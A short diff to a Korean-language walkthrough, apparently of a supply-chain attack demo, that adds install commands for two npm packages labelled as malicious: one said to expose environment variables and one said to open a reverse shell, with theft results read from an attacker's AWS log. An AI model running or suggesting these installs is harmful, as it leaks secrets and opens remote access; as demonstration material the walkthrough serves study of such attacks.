@@ -137,7 +137,8 @@ Victim Server에서 install script (npm)
 
 (3) 악성 npm 패키지 설치
 
-	npm install 
+	npm install estree-util // 환경변수 노출 패키지
+	npm install metro-evaluator // 리버스쉘 패키지
 
 (4) 환경변수 탈취 결과는 AWS 공격자 서버 로그에서 확인
 	
